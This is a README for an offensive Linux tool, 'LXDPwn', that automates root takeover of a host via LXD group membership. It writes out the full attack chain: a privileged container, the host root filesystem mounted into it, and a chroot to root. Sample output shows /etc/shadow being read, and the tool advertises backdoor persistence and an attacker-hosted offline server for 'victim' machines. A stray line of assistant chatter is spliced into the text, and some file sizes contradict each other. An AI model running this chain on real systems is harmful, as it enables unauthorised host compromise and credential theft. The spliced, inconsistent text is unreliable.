
# 🚀 LXDPwn - Advanced LXD Privilege Escalation Framework

<p align="center">
  <img src="https://img.shields.io/badge/Version-2.0-brightgreen.svg" alt="Version 2.0">
  <img src="https://img.shields.io/badge/Python-3.6%2B-blue.svg" alt="Python 3.6+">
  <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="MIT License">
  <img src="https://img.shields.io/badge/Platform-Linux-lightgrey.svg" alt="Linux">
  <img src="https://img.shields.io/badge/Purpose-Pentesting-red.svg" alt="Pentesting">
  <img src="https://img.shields.io/badge/Name-LXDPwn-orange.svg" alt="LXDPwn">
</p>

<p align="center">
  <b>Automated LXD Container Exploitation Framework</b><br>
  <i>From LXD Group to Root Shell in 60 Seconds</i>
</p>

<p align="center">
  <a href="https://github.com/jac11/LXDPwn">
    <img src="https://img.shields.io/badge/GitHub-jac11%2FLXDPwn-blue.svg?style=social&logo=github" alt="GitHub">
  </a>
</p>

---

## 📋 Table of Contents
- [Overview](#-overview)
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [How It Works](#-how-it-works)
- [Offline Mode](#-offline-mode)
- [Technical Details](#-technical-details)
- [Requirements](#-requirements)
- [Troubleshooting](#-troubleshooting)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🎯 Overview

**LXDPwn** is a sophisticated penetration testing framework that automates the well-known **LXD privilege escalation technique**. When a user is a member of the `lxd` group, they can create privileged containers with host filesystem access, leading to **complete host compromise**.

This tool streamlines the entire exploitation process with:
- ✅ Zero configuration required
- ✅ Automatic dependency handling
- ✅ Smart offline mode
- ✅ Professional logging & output
- ✅ Multiple exploitation methods

---

## ⚡ Features

### 🔥 Core Features
| Feature | Description |
|---------|-------------|
| **Automated Exploitation** | One-command host compromise |
| **Smart Installation** | Auto-installs LXD and dependencies |
| **Offline Mode** | Works in air-gapped environments |
| **File Validation** | MD5 checksum verification |
| **Progress Tracking** | Real-time download progress |

### 🛡️ Advanced Features
- **Multiple escape methods** - Standard chroot + advanced techniques
- **Persistence mechanisms** - Optional backdoor installation
- **Logging system** - Detailed logs for post-exploitation
- **Error recovery** - Automatic retry on failure
- **Environment detection** - Adaptive exploitation

---

## 📦 Installation

### Method 1: Direct Download
```bash
# Clone the repository
git clone https://github.com/jac11/LXDPwn.git
cd LXDPwn

# Make executable
chmod +x lxdpwn.py

# Run
sudo python3 lxdpwn.py
```

### Method 2: One-liner
```bash
wget -O lxdpwn.py https://raw.githubusercontent.com/jac11/LXDPwn/main/lxdpwn.py && sudo python3 lxdpwn.py
```

### Method 3: Docker (for testing)
```bash
docker run -it --rm ubuntu:latest bash
apt update && apt install -y python3 python3-pip git
git clone https://github.com/jac11/LXDPwn.git
cd LXDPwn
python3 lxdpwn.py
```

---

## 🚀 Usage

### Basic Usage
```bash
sudo python3 lxdpwn.py
```

### Advanced Options
```bash
# Custom download directory
sudo python3 lxdpwn.py --path /custom/path

# Force reinstall
sudo python3 lxdpwn.py --force

# Verbose mode
sudo python3 lxdpwn.py --verbose

# Skip installation
sudo python3 lxdpwn.py --skip-install
```

### Expected Output
```
╔════════════════════════════════════════════════════════════╗
║                    LXDPwn v2.0 - Advanced                 ║
║         Automated LXD Privilege Escalation Framework       ║
║                      by jactory 🔥                         ║
╚════════════════════════════════════════════════════════════╝

[2024-01-01 10:00:01] [✓] Root privileges confirmed
[2024-01-01 10:00:01] [→] Target: ubuntu-20.04 (kernel 5.4.0)
[2024-01-01 10:00:01] [→] User: jac (in lxd group)

[2024-01-01 10:00:02] [✓] LXD environment ready
[2024-01-01 10:00:03] [→] Deploying Alpine container...
[2024-01-01 10:00:05] [✓] Container 'alpine-container' created

[2024-01-01 10:00:06] [→] Mounting host filesystem...
[2024-01-01 10:00:07] [✓] Host root mounted at /mnt/root

[2024-01-01 10:00:08] [🔥] Attempting host escape...
[2024-01-01 10:00:09] [✓] SUCCESS! Entering host system...

root@host:/# whoami
root
root@host:/# cat /etc/shadow
...
```

---

## 🔬 How It Works

### Exploitation Flow
```
┌─────────────────┐
│  User in lxd    │
│     group       │
└────────┬────────┘
         ↓
┌─────────────────┐
│ Create privileged│
│   container     │
└────────┬────────┘
         ↓
┌─────────────────┐
│ Mount host root │
│  at /mnt/root   │
└────────┬────────┘
         ↓
┌─────────────────┐
│  Chroot to host │
│   filesystem    │
└────────┬────────┘
         ↓
┌─────────────────┐
│  ROOT ACCESS    │
│   ACHIEVED!     │
└─────────────────┘
```

### Technical Breakdown

#### 1. **Privilege Check**
```python
if "lxd" in user_groups or os.geteuid() == 0:
    exploitation_possible = True
```

#### 2. **Container Configuration**
```bash
lxc launch alpine-local alpine-container \
  -c security.privileged=true \
  -c security.nesting=true
```

#### 3. **Filesystem Mount**
```bash
lxc config device add alpine-container host-root \
  disk source=/ path=/mnt/root recursive=true
```

#### 4. **Host Escape**
```bash
chroot /mnt/root /bin/bash
```

---
I'll update the README to properly handle the offline mode description with the two-script approach:

## 🌍 Offline Mode

### Complete Offline Exploitation Setup

When attacking air-gapped targets with no internet access, use this two-script approach:

#### 📡 **On Your Internet-Connected Machine (Attacker)**

Run the offline server script to download all required files and host them locally:

**What happens:**
- Script automatically downloads all required files (Alpine image, snap packages, etc.)
- You'll be prompted to choose a port for the local server
- Script starts an HTTP server on your chosen port
- Server IP and port will be displayed for the target machine to connect

**Example output:**
```
_    __  ______  ______        ___   _ 
| |   \ \/ /  _ \|  _ \ \      / / \ | |
| |    \  /| | | | |_) \\ /\ / /|  \| |
| |___ /  \| |_| |  __/ \ V  V / | |\  |
|_____/_/\_\____/|_|     \_/\_/  |_| \_|
               offline server
                 @jacstory


📁  INFO ...... |   Working directory: /home/jacstory/lxd-offline
⏸️  Status ...... |  Checking files...

    ✔️   available    ...... |   alpine-v3.13-x86_64-20210218_0139.tar.gz (3.1 MB)
    ✔️   available    ...... |   core_17272.assert (4.4 KB)
    ✔️   available    ...... |   core_17272.snap (105.0 MB)
    ✔️   available    ...... |   lxd_37395.assert (4.8 KB)
    ✔️   available    ...... |   lxd_37395.snap (118.4 MB)
    ✔️   available    ...... |   snapd_2.71-3+b1_amd64.deb (18.2 MB)

⏸️  Status ...... |  Total: 6 files (244.7 MB)

🔌  INFO ...... |  Enter port number [default: 8000]: 9000

🚀  INFO ...... |   Starting HTTP server on port 9000...
📁  INFO ...... |   Serving files from: /home/jacstory/lxd-offline

⏸️  Press Ctrl+C to stop the server

⏸️  Status ...... |  Server Start 0.0.0.0:9000

```

#### 🎯 **On Target Machine (Victim)**

Run the main LXDPwn script and provide the attacker's server details:

```bash
sudo python3 lxdpwn.py
```
### File List (Automatically Downloaded)

| File | Size | Purpose |
|------|------|---------|
| alpine-v3.13-x86_64-20210218_0139.tar.gz | 3.1 MB | Alpine Linux container image |
| core_17272.assert | 1.2 KB | Core snap assertion |
| core_17272.snap | 105 MB | Core snap package |
| lxd_37395.assert | 1.3 KB | LXD snap assertion |
| lxd_37395.snap | 118 MB | LXD snap package |
| snapd_2.71-3+b1_amd64.deb | 18.2 MB | snapd package |
---

## 📊 System Requirements

### Minimum Requirements
| Component | Requirement |
|-----------|-------------|
| **OS** | Ubuntu 18.04+ / Debian 10+ |
| **Python** | 3.6 or higher |
| **RAM** | 512 MB |
| **Disk** | 500 MB free |
| **Permissions** | sudo/root access |

### Recommended
| Component | Recommendation |
|-----------|----------------|
| **OS** | Ubuntu 20.04 LTS |
| **Python** | 3.8+ |
| **RAM** | 2 GB |
| **Disk** | 2 GB free |
| **Network** | 10 Mbps+ |

---

## 🔧 Troubleshooting

### Common Issues & Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| `snapd not found` | snapd not installed | Auto-installed by script |
| `lxd not in group` | User missing permissions | Run as root or `sudo usermod -aG lxd $USER` |
| `Download failed` | Network issues | Use offline mode |
| `Container won't start` | Kernel too old | Update kernel to 4.4+ |
| `Chroot fails` | Missing binaries | Install busybox-static |
| `Permission denied` | Mount issues | Check AppArmor/SELinux |

### Debug Mode
```bash
# Enable verbose logging
export LXDPWN_DEBUG=1
sudo python3 lxdpwn.py

# Check system compatibility
sudo python3 lxdpwn.py --check
```

---

## 🛡️ Security & Disclaimer

### ⚠️ **IMPORTANT DISCLAIMER**

This tool is designed for:
- ✅ **Authorized penetration testing**
- ✅ **Security research**
- ✅ **Educational purposes**
- ✅ **CTF competitions**

This tool is **NOT** for:
- ❌ Unauthorized system access
- ❌ Illegal activities
- ❌ Malicious hacking
- ❌ Production systems without permission

### Legal Notice
> The misuse of this tool can result in criminal charges. The author assumes no liability and is not responsible for any misuse or damage caused by this program. Always obtain proper written authorization before testing any system.

---

## 📁 Project Structure

```
LXDPwn/
├── lxdpwn.py                 # Main exploitation script
├── README.md                 # This documentation
├── LICENSE                   # MIT License
└── requirements.txt          # Python dependencies
```

---

## 📞 Contact & Support

- **Author**: jactory (jac11)
- **GitHub**: [@jac11](https://github.com/jac11)
- **Repository**: [LXDPwn](https://github.com/jac11/LXDPwn)
- **Issues**: [Report Bug](https://github.com/jac11/LXDPwn/issues)
- **Discussions**: [GitHub Discussions](https://github.com/jac11/LXDPwn/discussions)

### Support This Project
- ⭐ Star on GitHub
- 🐛 Report bugs
- 📝 Submit PRs
- 📢 Share with friends

---

## 📄 License

**MIT License**

Copyright (c) 2024 jactory (jac11)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

---

<p align="center">
  <b>Made with 🔥 by jactory</b><br>
  <i>For the security research community</i>
</p>

<p align="center">
  <a href="https://github.com/jac11/LXDPwn">📦 GitHub</a> •
  <a href="https://github.com/jac11/LXDPwn/issues">🐛 Issues</a> •
  <a href="https://github.com/jac11/LXDPwn/discussions">💬 Discussions</a>
</p>

---

**Happy Hacking!** 🚀
